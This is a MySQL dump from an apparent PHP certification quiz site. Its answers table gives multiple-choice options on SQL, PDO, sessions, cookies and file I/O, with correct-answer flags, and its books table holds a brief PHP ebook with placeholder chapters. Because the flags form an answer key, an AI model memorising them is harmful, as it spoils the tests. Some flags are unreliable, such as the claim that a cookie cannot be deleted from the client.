	(1072,219,'SELECT...ALL',0,'2012-11-24 15:03:54','2012-11-24 15:03:54'),
	(1073,219,'SELECT...TOP',0,'2012-11-24 15:03:54','2012-11-24 15:03:54'),
	(1074,219,'SELECT...DISTINCT',1,'2012-11-24 15:03:54','2012-11-24 15:03:54'),
	(1075,219,'SELECT...WHERE',0,'2012-11-24 15:03:54','2012-11-24 15:03:54'),
	(1076,220,'SELECT DISTINCT Product_No, Prod_Category FROM Products;',1,'2012-11-24 15:05:44','2012-11-24 15:05:44'),
	(1077,220,'SELECT Product_No, Prod_Category FROM Products;',0,'2012-11-24 15:05:44','2012-11-24 15:05:44'),
	(1078,220,'SELECT Product_No, Prod_Category FROM Products GROUP BY Product_No;',0,'2012-11-24 15:05:44','2012-11-24 15:05:44'),
	(1079,220,'SELECT Product_No, Prod_Category FROM Products GROUP BY Product_No ORDER BY Product_No;',0,'2012-11-24 15:05:44','2012-11-24 15:05:44'),
	(1080,221,'A GROUP BY clause returns a single row of information for each group of rows.',1,'2012-11-24 15:06:40','2012-11-24 15:06:40'),
	(1081,221,'A GROUP BY clause returns a single row of information for each group of rows, in addition to all the rows.',0,'2012-11-24 15:06:40','2012-11-24 15:06:40'),
	(1082,221,'A GROUP BY clause automatically sorts the grouped result in ascending order, if the DESC keyword is not defined.',0,'2012-11-24 15:06:40','2012-11-24 15:06:40'),
	(1083,221,'A GROUP BY clause automatically sorts the grouped result in descending order.',0,'2012-11-24 15:06:40','2012-11-24 15:06:40'),
	(1084,222,'SELECT e.EmpName, m.ManagerName FROM Employees e INNER JOIN Employees m ON e.EmpID = m.ManagerID;',1,'2012-11-24 15:09:29','2012-11-24 15:09:29'),
	(1085,222,'SELECT e.EmpName, m.ManagerName FROM Employees e, Employees m WHERE e.EmpID = m.ManagerID;',1,'2012-11-24 15:09:29','2012-11-24 15:09:29'),
	(1086,222,'SELECT e.EmpName, m.ManagerName FROM Employees e LEFT OUTER JOIN Employees m ON e.EmpID = m.ManagerID;',0,'2012-11-24 15:09:29','2012-11-24 15:09:29'),
	(1087,222,'SELECT e.EmpName, m.ManagerName FROM Employees e SELF JOIN Employees m ON e.EmpID = m.ManagerID;',0,'2012-11-24 15:09:29','2012-11-24 15:09:29'),
	(1088,223,'select fname, lname from employees group by lname;',0,'2012-11-24 15:11:38','2012-11-24 15:11:38'),
	(1089,223,'select fname, lname from employees order by lname desc;',0,'2012-11-24 15:11:38','2012-11-24 15:11:38'),
	(1090,223,'select fname, lname from employees order by lname asc;',1,'2012-11-24 15:11:38','2012-11-24 15:11:38'),
	(1091,223,'select fname, lname from employees order by lname;',1,'2012-11-24 15:11:38','2012-11-24 15:11:38'),
	(1092,224,'Outer join',1,'2012-11-24 15:12:23','2012-11-24 15:12:23'),
	(1093,224,'Non-equijoin',0,'2012-11-24 15:12:23','2012-11-24 15:12:23'),
	(1094,224,'Equijoin',0,'2012-11-24 15:12:23','2012-11-24 15:12:23'),
	(1095,224,'Self join',0,'2012-11-24 15:12:23','2012-11-24 15:12:23'),
	(1096,225,'Self join',0,'2012-11-24 15:13:21','2012-11-24 15:13:21'),
	(1097,225,'Outer join',0,'2012-11-24 15:13:21','2012-11-24 15:13:21'),
	(1098,225,'Equijoin',1,'2012-11-24 15:13:21','2012-11-24 15:13:21'),
	(1099,225,'Non-equijoin',0,'2012-11-24 15:13:21','2012-11-24 15:13:21'),
	(1100,226,'SELECT Stud.Student_ID, Cou.Course_ID FROM Students Stud, Courses Cou WHERE Stud.Course_ID = Cou.Course_ID;',0,'2012-11-24 15:14:11','2012-11-24 15:14:11'),
	(1101,226,'SELECT Stud.Student_ID, Cou.Course_ID FROM Students Stud, Courses Cou WHERE Stud.Course_ID (+) = Cou.Course_ID;',1,'2012-11-24 15:14:11','2012-11-24 15:14:11'),
	(1102,226,'SELECT Stud.Student_ID, Cou.Course_ID FROM Students Stud, Courses Cou WHERE Stud.Student_ID = Cou.Course_ID;',0,'2012-11-24 15:14:11','2012-11-24 15:14:11'),
	(1103,226,'SELECT Stud.Student_ID, Cou.Course_ID FROM Students Stud, Courses Cou WHERE Stud.Fees BETWEEN Cou.Min_Fees and Cou.Max_Fees;',0,'2012-11-24 15:14:11','2012-11-24 15:14:11'),
	(1104,227,'Outer join',0,'2012-11-24 15:15:02','2012-11-24 15:15:02'),
	(1105,227,'Equijoin',0,'2012-11-24 15:15:02','2012-11-24 15:15:02'),
	(1106,227,'Self join',0,'2012-11-24 15:15:02','2012-11-24 15:15:02'),
	(1107,227,'Non-equijoin',1,'2012-11-24 15:15:02','2012-11-24 15:15:02'),
	(1108,228,'OR',1,'2012-11-24 15:15:42','2012-11-24 15:15:42'),
	(1109,228,'AND',0,'2012-11-24 15:15:42','2012-11-24 15:15:42'),
	(1110,228,'IN',1,'2012-11-24 15:15:42','2012-11-24 15:15:42'),
	(1111,228,'=',0,'2012-11-24 15:15:42','2012-11-24 15:15:42'),
	(1112,229,'Equijoin',0,'2012-11-24 15:19:02','2012-11-24 15:19:02'),
	(1113,229,'Cross join',0,'2012-11-24 15:19:02','2012-11-24 15:19:02'),
	(1114,229,'Self join',1,'2012-11-24 15:19:02','2012-11-24 15:19:02'),
	(1115,229,'Outer join',0,'2012-11-24 15:19:02','2012-11-24 15:19:02'),
	(1116,230,'SELECT e.EmpName, m.ManagerName FROM Employees e INNER JOIN Employees m ON e.EmpID = m.ManagerID;',1,'2012-11-24 15:20:31','2012-11-24 15:20:31'),
	(1117,230,'SELECT e.EmpName, m.ManagerName FROM Employees e, Employees m WHERE e.EmpID = m.ManagerID;',1,'2012-11-24 15:20:31','2012-11-24 15:20:31'),
	(1118,230,'SELECT e.EmpName, m.ManagerName FROM Employees e LEFT OUTER JOIN Employees m ON e.EmpID = m.ManagerID;',0,'2012-11-24 15:20:31','2012-11-24 15:20:31'),
	(1119,230,'SELECT e.EmpName, m.ManagerName FROM Employees e SELF JOIN Employees m ON e.EmpID = m.ManagerID;',0,'2012-11-24 15:20:31','2012-11-24 15:20:31'),
	(1120,231,'LEFT OUTER JOIN',0,'2012-11-24 15:21:12','2012-11-24 15:21:12'),
	(1121,231,'CROSS JOIN',0,'2012-11-24 15:21:12','2012-11-24 15:21:12'),
	(1122,231,'RIGHT OUTER JOIN',0,'2012-11-24 15:21:12','2012-11-24 15:21:12'),
	(1123,231,'FULL OUTER JOIN',1,'2012-11-24 15:21:12','2012-11-24 15:21:12'),
	(1124,232,'PDOStatement->nextRowset()',1,'2012-11-24 15:21:59','2012-11-24 15:21:59'),
	(1125,232,'PDOStatement->rowCount()',0,'2012-11-24 15:21:59','2012-11-24 15:21:59'),
	(1126,232,'PDOStatement->fetchAll()',0,'2012-11-24 15:21:59','2012-11-24 15:21:59'),
	(1127,232,'PDOStatement->fetch()',0,'2012-11-24 15:21:59','2012-11-24 15:21:59'),
	(1128,233,'!in_array(\"Location: $url\", header_list())',0,'2012-11-24 15:22:47','2012-11-24 15:22:47'),
	(1129,233,'headers_sent ([ string &$file [, int &$line ]] )',1,'2012-11-24 15:22:47','2012-11-24 15:22:47'),
	(1130,233,'header_sent(true)',0,'2012-11-24 15:22:47','2012-11-24 15:22:47'),
	(1131,233,'!header_sent(true)',0,'2012-11-24 15:22:47','2012-11-24 15:22:47'),
	(1132,234,'$row = $stmt->fetch()',1,'2012-11-24 15:24:18','2012-11-24 15:24:18'),
	(1133,234,'$row = $stmt->get()',0,'2012-11-24 15:24:18','2012-11-24 15:24:18'),
	(1134,234,'$row = $stmt->fetchall()',0,'2012-11-24 15:24:18','2012-11-24 15:24:18'),
	(1135,234,'$row = $stmt->getch()',0,'2012-11-24 15:24:18','2012-11-24 15:24:18'),
	(1136,235,'It cannot prevent SQL injection without needing to escape data.',0,'2012-11-24 15:25:08','2012-11-24 15:25:08'),
	(1137,235,'It is slower for one time queries since it requires two requests from the MySQL server.',1,'2012-11-24 15:25:08','2012-11-24 15:25:08'),
	(1138,235,'It is limited to SELECT, INSERT, REPLACE, UPDATE, DELETE, and CREATE TABLE queries.',1,'2012-11-24 15:25:08','2012-11-24 15:25:08'),
	(1139,235,'It does not allow you to repeat the same statement without the overhead of parsing the SQL.',0,'2012-11-24 15:25:08','2012-11-24 15:25:08'),
	(1140,236,'create index foox on foo (c1)',0,'2012-11-24 15:26:48','2012-11-24 15:26:48'),
	(1141,236,'create index foox on foo (c1,c3)',0,'2012-11-24 15:26:48','2012-11-24 15:26:48'),
	(1142,236,'create unique index foox on foo (c1,c3)',0,'2012-11-24 15:26:48','2012-11-24 15:26:48'),
	(1143,236,'create unique index foox on foo (c1) include (c3)',1,'2012-11-24 15:26:48','2012-11-24 15:26:48'),
	(1144,237,'Atomicity',0,'2012-11-24 15:27:35','2012-11-24 15:27:35'),
	(1145,237,'Consistency',0,'2012-11-24 15:27:35','2012-11-24 15:27:35'),
	(1146,237,'Isolation',0,'2012-11-24 15:27:35','2012-11-24 15:27:35'),
	(1147,237,'Durability',1,'2012-11-24 15:27:35','2012-11-24 15:27:35'),
	(1148,238,'PDOStatement::errorInfo',0,'2012-11-24 15:28:24','2012-11-24 15:28:24'),
	(1149,238,'PDOStatement::execute',1,'2012-11-24 15:28:24','2012-11-24 15:28:24'),
	(1150,238,'PDOStatement::fetch',0,'2012-11-24 15:28:24','2012-11-24 15:28:24'),
	(1151,238,'PDOStatement::fetchAll',0,'2012-11-24 15:28:24','2012-11-24 15:28:24'),
	(1152,239,'session_destroy()',1,'2012-11-24 15:35:05','2012-11-24 15:35:05'),
	(1153,239,'session_regenerate_id()',0,'2012-11-24 15:35:05','2012-11-24 15:35:05'),
	(1154,239,'delete_session_variable()',0,'2012-11-24 15:35:05','2012-11-24 15:35:05'),
	(1155,239,'remove_session_element()',0,'2012-11-24 15:35:05','2012-11-24 15:35:05'),
	(1156,240,'session.use_trans_sid',1,'2012-11-24 15:36:00','2012-11-24 15:36:00'),
	(1157,240,'session.auto_start',0,'2012-11-24 15:36:00','2012-11-24 15:36:00'),
	(1158,240,'session.use_cookies',0,'2012-11-24 15:36:00','2012-11-24 15:36:00'),
	(1159,240,'session.save_path',0,'2012-11-24 15:36:00','2012-11-24 15:36:00'),
	(1160,241,'Set the enable_dl option to 0 in the php.ini file.',1,'2012-11-24 15:36:47','2012-11-24 15:36:47'),
	(1161,241,'Add the dl() function in the blocked_functions() list in the php.ini file.',0,'2012-11-24 15:36:47','2012-11-24 15:36:47'),
	(1162,241,'Add the dl() function in the disable_functions list in the PHP.ini configuration file.',1,'2012-11-24 15:36:47','2012-11-24 15:36:47'),
	(1163,241,'Set the enable_dl option to 1 in the php.ini file.',0,'2012-11-24 15:36:47','2012-11-24 15:36:47'),
	(1164,242,'Set zlib.output_compression to on.',1,'2012-11-24 15:37:35','2012-11-24 15:37:35'),
	(1165,242,'Use the ob_start() function.',0,'2012-11-24 15:37:35','2012-11-24 15:37:35'),
	(1166,242,'Turn compress_code setting to true.',0,'2012-11-24 15:37:35','2012-11-24 15:37:35'),
	(1167,242,'Set zlib_compression to on.',0,'2012-11-24 15:37:35','2012-11-24 15:37:35'),
	(1168,243,'<select multiple name=\"select_box[]\">',1,'2012-11-24 15:40:30','2012-11-24 15:40:30'),
	(1169,243,'<select multiple name=\"select_box=array()\">',0,'2012-11-24 15:40:30','2012-11-24 15:40:30'),
	(1170,243,'<select multiple name=\"select_box\">',0,'2012-11-24 15:40:30','2012-11-24 15:40:30'),
	(1171,243,'<select multiple name=\"select_box[multiple]\">',0,'2012-11-24 15:40:30','2012-11-24 15:40:30'),
	(1172,244,'1',0,'2012-11-24 15:41:30','2012-11-24 15:41:30'),
	(1173,244,'2',0,'2012-11-24 15:41:30','2012-11-24 15:41:30'),
	(1174,244,'Orange',1,'2012-11-24 15:41:30','2012-11-24 15:41:30'),
	(1175,244,'Null',0,'2012-11-24 15:41:30','2012-11-24 15:41:30'),
	(1176,245,'Welcome John and Maria!',0,'2012-11-24 15:43:09','2012-11-24 15:43:09'),
	(1177,245,'Welcome John and John!',0,'2012-11-24 15:43:09','2012-11-24 15:43:09'),
	(1178,245,'Welcome Maria and John!',0,'2012-11-24 15:43:09','2012-11-24 15:43:09'),
	(1179,245,'Welcome Maria and Maria!',1,'2012-11-24 15:43:09','2012-11-24 15:43:09'),
	(1180,246,'$_POST[]',0,'2012-11-24 15:44:27','2012-11-24 15:44:27'),
	(1181,246,'$_GET[]',0,'2012-11-24 15:44:27','2012-11-24 15:44:27'),
	(1182,246,'$_REQUEST[]',1,'2012-11-24 15:44:27','2012-11-24 15:44:27'),
	(1183,246,'$_SEND[]',0,'2012-11-24 15:44:27','2012-11-24 15:44:27'),
	(1184,247,'<form enctype=\"multipart/form-data\" action=\"index.php\" method=\"post\">',1,'2012-11-24 15:47:19','2012-11-24 15:47:19'),
	(1185,247,'<form enctype=\"application/x-www-form-urlencoded\" action=\"index.php\" method=\"post\">',0,'2012-11-24 15:47:19','2012-11-24 15:47:19'),
	(1186,247,'<form enctype=\"text/plain\" action=\"index.php\" method=\"post\">',0,'2012-11-24 15:47:19','2012-11-24 15:47:19'),
	(1187,247,'<form enctype=\"plain\" action=\"index.php\" method=\"post\">',0,'2012-11-24 15:47:19','2012-11-24 15:47:19'),
	(1188,248,'5,000 bytes',1,'2012-11-24 15:48:38','2012-11-24 15:48:38'),
	(1189,248,'5,000 Kilobytes',0,'2012-11-24 15:48:38','2012-11-24 15:48:38'),
	(1190,248,'5,000 bits',0,'2012-11-24 15:48:38','2012-11-24 15:48:38'),
	(1191,248,'5,000 Megabytes',0,'2012-11-24 15:48:38','2012-11-24 15:48:38'),
	(1192,249,'$_FILES',1,'2012-11-24 15:52:08','2012-11-24 15:52:08'),
	(1193,249,'$_REQUEST',0,'2012-11-24 15:52:08','2012-11-24 15:52:08'),
	(1194,249,'$_ENV',0,'2012-11-24 15:52:08','2012-11-24 15:52:08'),
	(1195,249,'$_COOKIE',0,'2012-11-24 15:52:08','2012-11-24 15:52:08'),
	(1196,250,'You cannot delete a cookie from a client computer.',1,'2012-11-24 15:53:26','2012-11-24 15:53:26'),
	(1197,250,'You can delete a cookie by using the delcookie() function.',0,'2012-11-24 15:53:26','2012-11-24 15:53:26'),
	(1198,250,'You have to set the session.gc_maxlifetime INI setting in the php.ini file.',0,'2012-11-24 15:53:26','2012-11-24 15:53:26'),
	(1199,250,'You can delete a cookie by using the session.rem_cookie() function.',0,'2012-11-24 15:53:26','2012-11-24 15:53:26'),
	(1200,251,'httponly',1,'2012-11-24 15:54:14','2012-11-24 15:54:14'),
	(1201,251,'secure',0,'2012-11-24 15:54:14','2012-11-24 15:54:14'),
	(1202,251,'expire=DATE',0,'2012-11-24 15:54:14','2012-11-24 15:54:14'),
	(1203,251,'none',0,'2012-11-24 15:54:14','2012-11-24 15:54:14'),
	(1204,252,'$_COOKIE',1,'2012-11-24 15:55:14','2012-11-24 15:55:14'),
	(1205,252,'$_REQUEST',1,'2012-11-24 15:55:14','2012-11-24 15:55:14'),
	(1206,252,'$_GET',0,'2012-11-24 15:55:14','2012-11-24 15:55:14'),
	(1207,252,'$_POST',0,'2012-11-24 15:55:14','2012-11-24 15:55:14'),
	(1208,253,'$xml = simplexml_load_string($string); print_r($xml);',1,'2012-11-24 15:56:52','2012-11-24 15:56:52'),
	(1209,253,'$xml = load_XML($string); print_r($xml);',0,'2012-11-24 15:56:52','2012-11-24 15:56:52'),
	(1210,253,'$xml = XML_string($string); print_r($xml);',0,'2012-11-24 15:56:52','2012-11-24 15:56:52'),
	(1211,253,'$xml = simplexml_string($string); print_r($xml);',0,'2012-11-24 15:56:52','2012-11-24 15:56:52'),
	(1212,254,'It gets the name of a SimpleXML element.',0,'2012-11-24 15:58:17','2012-11-24 15:58:17'),
	(1213,254,'It gets the namespaces from XML data.',0,'2012-11-24 15:58:17','2012-11-24 15:58:17'),
	(1214,254,'It gets a SimpleXMLElement object from a DOM node.',1,'2012-11-24 15:58:17','2012-11-24 15:58:17'),
	(1215,254,'It gets a SimpleXMLElement object from an XML document.',0,'2012-11-24 15:58:17','2012-11-24 15:58:17'),
	(1216,255,'zlib.output_compression = on',1,'2012-11-24 15:59:28','2012-11-24 15:59:28'),
	(1217,255,'zlib.output_compression_level = 9',1,'2012-11-24 15:59:28','2012-11-24 15:59:28'),
	(1218,255,'set_compression = on',0,'2012-11-24 15:59:28','2012-11-24 15:59:28'),
	(1219,255,'set _compression_level = 9',0,'2012-11-24 15:59:28','2012-11-24 15:59:28'),
	(1220,256,'It redirects the page to the given link.',1,'2012-11-24 16:15:58','2012-11-24 16:15:58'),
	(1221,256,'It saves the cookie value in the client\'s browser.',0,'2012-11-24 16:15:58','2012-11-24 16:15:58'),
	(1222,256,'It displays the header information of the given link.',0,'2012-11-24 16:15:58','2012-11-24 16:15:58'),
	(1223,256,'It displays the cookie of the given link.',0,'2012-11-24 16:15:58','2012-11-24 16:15:58'),
	(1224,257,'setrawcookie()',1,'2012-11-24 16:20:25','2012-11-24 16:20:25'),
	(1225,257,'setcookie()',0,'2012-11-24 16:20:25','2012-11-24 16:20:25'),
	(1226,257,'headers_sent()',0,'2012-11-24 16:20:25','2012-11-24 16:20:25'),
	(1227,257,'headers_list()',0,'2012-11-24 16:20:25','2012-11-24 16:20:25'),
	(1228,258,'header(\"Location: http://php.com\");',1,'2012-11-24 16:22:36','2012-11-24 16:22:36'),
	(1229,258,'redirect(\"Location: http://php.com\");',0,'2012-11-24 16:22:36','2012-11-24 16:22:36'),
	(1230,258,'header(\"http://php.com\");',0,'2012-11-24 16:22:36','2012-11-24 16:22:36'),
	(1231,258,'redirect(\"http://php.com\");',0,'2012-11-24 16:22:36','2012-11-24 16:22:36'),
	(1232,259,'1.pdf',0,'2012-11-24 16:24:53','2012-11-24 16:24:53'),
	(1233,259,'2.pdf',1,'2012-11-24 16:24:53','2012-11-24 16:24:53'),
	(1234,259,'NULL',0,'2012-11-24 16:24:53','2012-11-24 16:24:53'),
	(1235,259,'The script will throw an error message.',0,'2012-11-24 16:24:53','2012-11-24 16:24:53'),
	(1236,260,'array(1,2,3,4,5,6)',0,'2012-11-24 16:27:08','2012-11-24 16:27:08'),
	(1237,260,'array(1=>4,2=>5,3=>6)',1,'2012-11-24 16:27:08','2012-11-24 16:27:08'),
	(1238,260,'array(1=>2,3=>4,5=>6)',0,'2012-11-24 16:27:08','2012-11-24 16:27:08'),
	(1239,260,'script error',0,'2012-11-24 16:27:08','2012-11-24 16:27:08'),
	(1240,261,'3XX',1,'2012-11-24 16:28:08','2012-11-24 16:28:08'),
	(1241,261,'5XX',0,'2012-11-24 16:28:08','2012-11-24 16:28:08'),
	(1242,261,'1XX',0,'2012-11-24 16:28:08','2012-11-24 16:28:08'),
	(1243,261,'4XX',0,'2012-11-24 16:28:08','2012-11-24 16:28:08'),
	(1244,262,'fgetss($fp);',1,'2012-11-24 16:52:41','2012-11-24 16:52:41'),
	(1245,262,'fgets($fp);',1,'2012-11-24 16:52:41','2012-11-24 16:52:41'),
	(1246,262,'fread($fp, 1024);',0,'2012-11-24 16:52:41','2012-11-24 16:52:41'),
	(1247,262,'fread($fp);',0,'2012-11-24 16:52:41','2012-11-24 16:52:41'),
	(1248,263,'It indicates whether or not include_path should be used.',1,'2012-11-24 16:54:19','2012-11-24 16:54:19'),
	(1249,263,'It indicates the number of bytes to read.',0,'2012-11-24 16:54:19','2012-11-24 16:54:19'),
	(1250,263,'It specifies the stream context.',0,'2012-11-24 16:54:19','2012-11-24 16:54:19'),
	(1251,263,'It identifies the starting offset.',0,'2012-11-24 16:54:19','2012-11-24 16:54:19'),
	(1252,264,'fread($fp,1)',1,'2012-11-24 16:55:17','2012-11-24 16:55:17'),
	(1253,264,'fgetc($fp)',1,'2012-11-24 16:55:17','2012-11-24 16:55:17'),
	(1254,264,'fgets($fp,1)',0,'2012-11-24 16:55:17','2012-11-24 16:55:17'),
	(1255,264,'fgetss($fp,1)',0,'2012-11-24 16:55:17','2012-11-24 16:55:17'),
	(1256,265,'It contains the name of the file and full path.',1,'2012-11-24 16:56:06','2012-11-24 16:56:06'),
	(1257,265,'It contains name of the directory having file and full path of the directory.',0,'2012-11-24 16:56:06','2012-11-24 16:56:06'),
	(1258,265,'It contains the current line number of the file.',0,'2012-11-24 16:56:06','2012-11-24 16:56:06'),
	(1259,265,'It contains the path of the main script.',0,'2012-11-24 16:56:06','2012-11-24 16:56:06'),
	(1260,266,'is_readable()',1,'2012-11-24 16:57:21','2012-11-24 16:57:21'),
	(1261,266,'touch()',0,'2012-11-24 16:57:21','2012-11-24 16:57:21'),
	(1262,266,'stat()',1,'2012-11-24 16:57:21','2012-11-24 16:57:21'),
	(1263,266,'fseek()',0,'2012-11-24 16:57:21','2012-11-24 16:57:21'),
	(1264,267,'fread()',0,'2012-11-24 16:59:19','2012-11-24 16:59:19'),
	(1265,267,'ftell()',1,'2012-11-24 16:59:19','2012-11-24 16:59:19'),
	(1266,267,'feof()',0,'2012-11-24 16:59:19','2012-11-24 16:59:19'),
	(1267,267,'fseek()',0,'2012-11-24 16:59:19','2012-11-24 16:59:19'),
	(1268,268,'rewind()',1,'2012-11-24 17:02:34','2012-11-24 17:02:34'),
	(1269,268,'fgets()',0,'2012-11-24 17:02:34','2012-11-24 17:02:34'),
	(1270,268,'fgetss()',0,'2012-11-24 17:02:34','2012-11-24 17:02:34'),
	(1271,268,'file()',0,'2012-11-24 17:02:34','2012-11-24 17:02:34'),
	(1272,269,'fgetss()',1,'2012-11-24 17:04:57','2012-11-24 17:04:57'),
	(1273,269,'fgets()',0,'2012-11-24 17:04:57','2012-11-24 17:04:57'),
	(1274,269,'file_put_contents()',0,'2012-11-24 17:04:57','2012-11-24 17:04:57'),
	(1275,269,'file_get_contents()',0,'2012-11-24 17:04:57','2012-11-24 17:04:57'),
	(1276,270,'flock($fp, LOCK_UN);',1,'2012-11-24 17:05:50','2012-11-24 17:05:50'),
	(1277,270,'flock($fp, LOCK_EX);',0,'2012-11-24 17:05:50','2012-11-24 17:05:50'),
	(1278,270,'flock($fp, LOCK_SH);',0,'2012-11-24 17:05:50','2012-11-24 17:05:50'),
	(1279,270,'fclose($fp);',1,'2012-11-24 17:05:50','2012-11-24 17:05:50'),
	(1280,271,'Make sure that $_FILES[\'myVarName\'][\'size\'] > 0.',1,'2012-11-24 17:19:55','2012-11-24 17:19:55'),
	(1281,271,'Make sure that $_FILES[\'size\'] > 0.',0,'2012-11-24 17:19:55','2012-11-24 17:19:55'),
	(1282,271,'Make sure that $_FILES[\'error\'] = UPLOAD_ERR_OK (= 0).',0,'2012-11-24 17:19:55','2012-11-24 17:19:55'),
	(1283,271,'Make sure that $_FILES[\'myVarName\'][\'error\'] = UPLOAD_ERR_OK (= 0).',1,'2012-11-24 17:19:55','2012-11-24 17:19:55'),
	(1284,272,'file_put_contents(\"target.txt\",file_get_contents(\"source.txt\"));',1,'2012-11-24 17:20:41','2012-11-24 17:20:41'),
	(1285,272,'$handle = fopen(\"target.txt\",\"w+\"); fwrite($handle,file_get_contents(\"source.txt\")); fclose($handle);',1,'2012-11-24 17:20:41','2012-11-24 17:20:41'),
	(1286,272,'stream_copy_to_stream(\"source.txt\",\"target.txt\");',0,'2012-11-24 17:20:41','2012-11-24 17:20:41'),
	(1287,272,'$src = fopen(\'source.txt\', \'r\'); $dest = fopen(\'target.txt\', \'w\'); stream_copy_to_stream($src,$dest);',1,'2012-11-24 17:20:41','2012-11-24 17:20:41'),
	(1288,273,'stream_copy_to_stream ( resource $source , resource $destination)',1,'2012-11-24 17:23:31','2012-11-24 17:23:31'),
	(1289,273,'stream_copy_to_stream (resource $destination, resource $source )',0,'2012-11-24 17:23:31','2012-11-24 17:23:31'),
	(1290,273,'buffer_start()',0,'2012-11-24 17:23:31','2012-11-24 17:23:31'),
	(1291,273,'copy(resource $destination, resource $source)',0,'2012-11-24 17:23:31','2012-11-24 17:23:31'),
	(1292,274,'stream_set_write_buffer()',1,'2012-11-24 17:24:39','2012-11-24 17:24:39'),
	(1293,274,'ob_start()',0,'2012-11-24 17:24:39','2012-11-24 17:24:39'),
	(1294,274,'buffer_start()',0,'2012-11-24 17:24:39','2012-11-24 17:24:39'),
	(1295,274,'ob_buffer_start()',0,'2012-11-24 17:24:39','2012-11-24 17:24:39'),
	(1296,275,'unlink()',1,'2012-11-24 17:26:35','2012-11-24 17:26:35'),
	(1297,275,'delete()',0,'2012-11-24 17:26:35','2012-11-24 17:26:35'),
	(1298,275,'rmdir()',0,'2012-11-24 17:26:35','2012-11-24 17:26:35'),
	(1299,275,'unset()',0,'2012-11-24 17:26:35','2012-11-24 17:26:35'),
	(1300,276,'It will print the host name of the Internet host.',1,'2012-11-24 17:28:38','2012-11-24 17:28:38'),
	(1301,276,'It will print the standard host name for the local Web server.',0,'2012-11-24 17:28:38','2012-11-24 17:28:38'),
	(1302,276,'It will print the DNS resource records associated with the local Web server.',0,'2012-11-24 17:28:38','2012-11-24 17:28:38'),
	(1303,276,'It will print the list of header information sent.',0,'2012-11-24 17:28:38','2012-11-24 17:28:38'),
	(1304,277,'stream_set_timeout()',1,'2012-11-24 17:29:25','2012-11-24 17:29:25'),
	(1305,277,'stream_get_meta_data()',0,'2012-11-24 17:29:25','2012-11-24 17:29:25'),
	(1306,277,'stream_set_read_buffer()',0,'2012-11-24 17:29:25','2012-11-24 17:29:25'),
	(1307,277,'stream_set_time()',0,'2012-11-24 17:29:25','2012-11-24 17:29:25'),
	(1308,278,'0600',1,'2012-11-24 17:30:48','2012-11-24 17:30:48'),
	(1309,278,'0700',0,'2012-11-24 17:30:48','2012-11-24 17:30:48'),
	(1310,278,'1777',0,'2012-11-24 17:30:48','2012-11-24 17:30:48'),
	(1311,278,'0777',0,'2012-11-24 17:30:48','2012-11-24 17:30:48');

/*!40000 ALTER TABLE `answers` ENABLE KEYS */;
UNLOCK TABLES;


# Dump of table books
# ------------------------------------------------------------

DROP TABLE IF EXISTS `books`;

CREATE TABLE `books` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `title` varchar(64) NOT NULL,
  `exerpt` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `books_user_id_foreign` (`user_id`),
  CONSTRAINT `books_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `books` WRITE;
/*!40000 ALTER TABLE `books` DISABLE KEYS */;

INSERT INTO `books` (`id`, `user_id`, `title`, `exerpt`, `content`, `created_at`, `updated_at`)
VALUES
	(1,1,'PHP Basics','','<div id=\"ebook_container\">\r\n<div id=\"ebook\">\r\n<div id=\"columnize\">\r\n<div id=\"00QdR\">\r\n<p>In this chapter, you will learn about PHP syntax, operators, various control structures such as for loop, foreach loop, while loop, etc. You will also learn about language constructs, constants, operators, namespace, and byte caching, etc.</p>\r\n<h2>Syntax, Operators</h2>\r\n<p>&nbsp;</p>\r\n<h3>Tags available in the php language</h3>\r\n<p>There are four types of tags available in the php language as follows:<br />Standard Tags: These tags are the standard php tags, which are certainly available and cannot be disabled by changing the php.conf file. The syntax of standard tags is as follows:</p>\r\n<p><pre><?php\r\n      //code\r\n?></pre></p>\r\n<p>Short Tags: These tags are simple to use but can interfere with XML documents. The syntax of short tags is as follows:</p>\r\n<p><pre><?\r\n      //code\r\n?></pre></p>\r\n<p>or</p>\r\n<p><pre><?= $variable ?> </pre></p>\r\n<p>(It can be used to print the result of an expression directly in the output of the script.)<br />Script Tags: These are simple HTML language tags. The syntax of script tags is as follows:</p>\r\n<p><pre><script language=\"php\">\r\n      //code\r\n</script> </pre></p>\r\n<p>ASP Tags: These are simple ASP tags. The syntax of ASP tags is as follows:</p>\r\n<p><pre></p>\r\n<h3>Modulus operator</h3>\r\n<p>The modulus (%) operator is used to find out the remainder after a division has been completed. This can be used with integers and floating point numbers.</p>\r\n<p>The following example will demonstrate the use of the modulus operator:</p>\r\n<p><pre><?php\r\n    $a=10;\r\n    $b=4;\r\n    $c= $a%$b;\r\n    print($c);\r\n?> </pre></p>\r\n<p>In the above program, the value of variable c will be 2.</p>\r\n<p>&nbsp;</p>\r\n</div>\r\n</div>\r\n</div>\r\n</div>','2012-11-18 16:03:22','2012-11-23 23:42:14'),
	(2,1,'Functions and Arrays','','<p>Highly intelligent robots are scouting all the web and collecting every info containing to this topic. Please be patient...</p>','2012-11-18 21:42:17','2012-11-21 15:20:55'),
	(3,1,'Object Oriented Programming','','<p>Highly intelligent robots are scouting all the web and collecting every info containing to this topic. Please be patient...</p>','2012-11-19 22:17:05','2012-11-21 15:21:01'),
	(4,1,'Security','','<p>bum</p>','2012-11-23 22:24:49','2012-11-23 22:24:49'),
	(5,1,'Data format and Types','','<p>bu</p>','2012-11-23 23:12:00','2012-11-23 23:12:00'),
	(6,1,'String and Patterns','','<p>nop</p>','2012-11-24 13:42:48','2012-11-24 13:42:48'),
	(7,1,'Database and SQL','','<p>sql</p>','2012-11-24 14:55:48','2012-11-24 14:55:48'),
	(8,1,'Web features','','<p>web</p>','2012-11-24 15:30:50','2012-11-24 15:30:50'),
	(9,1,'INPUT and OUTPUT','','<p>;)</p>','2012-11-24 16:35:46','2012-11-24 16:35:46');

/*!40000 ALTER TABLE `books` ENABLE KEYS */;
UNLOCK TABLES;


# Dump of table groups
# ------------------------------------------------------------

DROP TABLE IF EXISTS `groups`;

CREATE TABLE `groups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(64) NOT NULL,
  `level` int(11) NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`)
